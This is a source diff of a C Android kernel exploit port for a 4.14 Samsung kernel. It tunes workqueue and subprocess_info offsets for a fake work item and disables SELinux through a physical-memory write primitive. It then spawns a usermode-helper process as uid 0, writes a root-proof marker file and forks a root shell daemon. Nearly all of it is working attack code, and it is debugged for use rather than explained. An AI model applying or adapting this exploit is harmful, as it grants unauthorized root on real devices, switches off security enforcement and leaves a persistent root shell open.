@@ -17,28 +17,36 @@
 #define UMH_BINARY_PATH "/data/local/tmp/a/e"
 
 /* Page layout: fake subprocess_info and umh data on the reclaimed page.
- * These sit above the exploit structures (which end around 0x1800). */
-#define UMH_WORK_OFF 0x2000
-#define UMH_DATA_OFF 0x2080
+ * IMPORTANT: in this port page_base is a SINGLE 4 KB memfd page (not the
+ * original order-3 32 KB slab), so the original 0x2000/0x2080 offsets wrote
+ * ~0x400 bytes into arbitrary unrelated physical pages.  Place them at 0x400
+ * instead: that region holds only the fake task_struct image, which is dead
+ * after the PI walk/redirect (configfs R/W only touches the fops table at
+ * 0x319 and the ashmem-name configfs_buffer).  Everything stays in-page. */
+#define UMH_WORK_OFF 0x400
+#define UMH_DATA_OFF 0x480
 
-/* Workqueue internal struct offsets (kernel-internal, stable across 6.x) */
-#define WQ_DFL_PWQ_OFF       0xb0
+/* Workqueue internal struct offsets for Linux 4.14 (measured from the OSRC
+ * G9700/G970W kernel/workqueue.c DWARF).  The previous values were 6.x and
+ * read wq->dfl_pwq at the wrong slot (0xb0 = wq_dev) -> NULL pwq -> panic. */
+#define WQ_DFL_PWQ_OFF       0xa8
 #define PWQ_POOL_OFF         0x00
 #define PWQ_WQ_OFF           0x08
 #define PWQ_WORK_COLOR_OFF   0x10
 #define PWQ_REFCNT_OFF       0x18
 #define PWQ_NR_IN_FLIGHT_OFF 0x1c
-#define PWQ_NR_ACTIVE_OFF    0x5c
-#define PWQ_MAX_ACTIVE_OFF   0x60
-#define POOL_WORKLIST_OFF    0x28
-#define POOL_NR_IDLE_OFF     0x3c
+#define PWQ_NR_ACTIVE_OFF    0x58
+#define PWQ_MAX_ACTIVE_OFF   0x5c
+#define POOL_WORKLIST_OFF    0x20
+#define POOL_NR_IDLE_OFF     0x34
+#define WORK_NR_COLORS_414   15
 #define WORK_DATA_OFF        0x00
 #define WORK_ENTRY_OFF       0x08
 #define WORK_FUNC_OFF        0x18
 
 /* Kernel subprocess_info layout (mirrors include/linux/umh.h) */
 struct umh_subprocess_info {
-  uint8_t work[48];
+  uint8_t work[32];   /* sizeof(struct work_struct) on 4.14 == 32 */
   uint64_t complete;
   uint64_t path;
   uint64_t argv;
@@ -68,8 +76,8 @@ struct umh_kernel_data {
   uint64_t envp[1];
 };
 
-_Static_assert(sizeof(struct umh_subprocess_info) == 112,
-               "subprocess_info layout");
+_Static_assert(sizeof(struct umh_subprocess_info) == 96,
+               "subprocess_info layout (4.14)");
 _Static_assert(sizeof(struct umh_completion) == 32,
                "completion layout");
 
@@ -124,9 +132,18 @@ static int wake_system_unbound(void) {
     close(master_fd);
     return 0;
   }
+  /* Merely opening a pty does not push the tty buffer work.  Write a byte so
+   * tty_schedule_flip() runs queue_work(system_unbound_wq, &port->buf.work):
+   * that wakes an idle worker of the same pool, and the worker then drains our
+   * fake work item sitting at the head of the pool worklist. */
+  char b = 'x';
+  ssize_t wm = write(master_fd, &b, 1);
+  ssize_t ws = write(slave_fd, &b, 1);
+  /* leave the pty open briefly so the queued work is not cancelled by close */
+  usleep(3000);
   int master_ok = close(master_fd) == 0;
   int slave_ok = close(slave_fd) == 0;
-  return master_ok && slave_ok;
+  return wm == 1 || ws == 1 || (master_ok && slave_ok);
 }
 
 /* --- Main UMH root function --- */
@@ -148,18 +165,42 @@ int install_umh_root(int configfs_fd) {
   /* 1. Disable SELinux (1-byte write via pipe physrw) */
   uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
   uint8_t permissive = 0;
+  pr_info("umh: step1 selinux addr=%016zx\n", (size_t)selinux_addr);
+  fsync(1);
   if (!pipe_phys_write_data(fd, selinux_addr,
                             &permissive, sizeof(permissive))) {
     pr_error("umh: selinux write failed\n");
     return 0;
   }
+  { int ef = open("/sys/fs/selinux/enforce", O_RDONLY); char eb[8] = {0};
+    if (ef >= 0) { ssize_t rn = read(ef, eb, sizeof(eb) - 1); (void)rn; close(ef); }
+    pr_info("umh: step1 selinux write ok; /sys/fs/selinux/enforce='%s'\n", eb);
+    fsync(1); }
 
   /* 2. Traverse: system_unbound_wq -> wq -> dfl_pwq -> pool */
   uintptr_t wq_slot = data_addr(wq_image);
+  pr_info("umh: step2 wq_slot=%016zx dfl_pwq_off=%#x\n",
+          (size_t)wq_slot, (unsigned)WQ_DFL_PWQ_OFF);
+  fsync(1);
   uintptr_t wq = umh_read64(fd, wq_slot);
+  pr_info("umh: step2 wq=%016zx\n", (size_t)wq);
+  fsync(1);
+  if (!is_direct_ptr(wq)) {
+    pr_error("umh: bad wq=%016zx\n", (size_t)wq);
+    return 0;
+  }
   uintptr_t pwq = umh_read64(fd, wq + WQ_DFL_PWQ_OFF);
+  pr_info("umh: step2 pwq=%016zx\n", (size_t)pwq);
+  fsync(1);
+  if (!is_direct_ptr(pwq)) {
+    pr_error("umh: bad pwq=%016zx\n", (size_t)pwq);
+    return 0;
+  }
   uintptr_t pool = umh_read64(fd, pwq + PWQ_POOL_OFF);
   uintptr_t pwq_wq = umh_read64(fd, pwq + PWQ_WQ_OFF);
+  pr_info("umh: step2 pool=%016zx pwq_wq=%016zx\n",
+          (size_t)pool, (size_t)pwq_wq);
+  fsync(1);
 
   if (!is_direct_ptr(wq) || !is_direct_ptr(pwq) ||
       !is_direct_ptr(pool) || pwq_wq != wq) {
@@ -196,7 +237,8 @@ int install_umh_root(int configfs_fd) {
   uint32_t nr_active = umh_read32(fd, pwq + PWQ_NR_ACTIVE_OFF);
   uint32_t max_active = umh_read32(fd, pwq + PWQ_MAX_ACTIVE_OFF);
 
-  if (color >= 16 || refcnt == 0 || nr_active >= max_active) {
+  if (color >= WORK_NR_COLORS_414 || refcnt == 0 ||
+      nr_active >= max_active) {
     pr_error("umh: bad pwq color=%u refcnt=%u active=%u/%u\n",
              color, refcnt, nr_active, max_active);
     return 0;
@@ -307,6 +349,14 @@ int install_umh_root(int configfs_fd) {
   int32_t umh_retval = (int32_t)umh_read32(
     fd, fake_work_addr + offsetof(struct umh_subprocess_info, retval));
 
+  pr_info("umh: post worklist=%016llx entry=%016llx work_data=%016llx "
+          "nr_active=%u retval=%d\n",
+          (unsigned long long)umh_read64(fd, worklist),
+          (unsigned long long)umh_read64(fd, worklist + sizeof(uint64_t)),
+          (unsigned long long)umh_read64(fd, fake_work_addr + WORK_DATA_OFF),
+          umh_read32(fd, pwq + PWQ_NR_ACTIVE_OFF), umh_retval);
+  fsync(1);
+
   pr_info("umh: result wake=%d complete=%u retval=%d\n",
           wake_ok, complete_done, umh_retval);
 
@@ -340,6 +390,30 @@ void handle_umh_mode(int argc, char **argv) {
   setsid();
   setgid(0);
   setuid(0);
+
+  /* Proof of root.  The first /data open can fail with ENOKEY (the fscrypt key
+   * is not yet resolved for a kernel-spawned task); retry a few times. */
+  for (int i = 0; i < 100; i++) {
+    int f = open("/data/local/tmp/umh_root_proof",
+                 O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (f >= 0) {
+      char b[128];
+      int n = snprintf(b, sizeof(b), "UMH ROOT uid=%d euid=%d gid=%d\n",
+                       getuid(), geteuid(), getgid());
+      if (n > 0) { ssize_t w = write(f, b, n); (void)w; }
+      close(f);
+      break;
+    }
+    usleep(50000);
+  }
+
+  /* The fscrypt key for /data is not yet resolved for this kernel-spawned
+   * task; the proof retry above warms it.  Only now start the root shell
+   * daemon so its own /data marker write also succeeds. */
+  {
+    pid_t d = fork();
+    if (d == 0) { root_shell_daemon(); _exit(0); }
+  }
 
   int null_fd = open("/dev/null", O_RDWR);
   if (null_fd >= 0) {
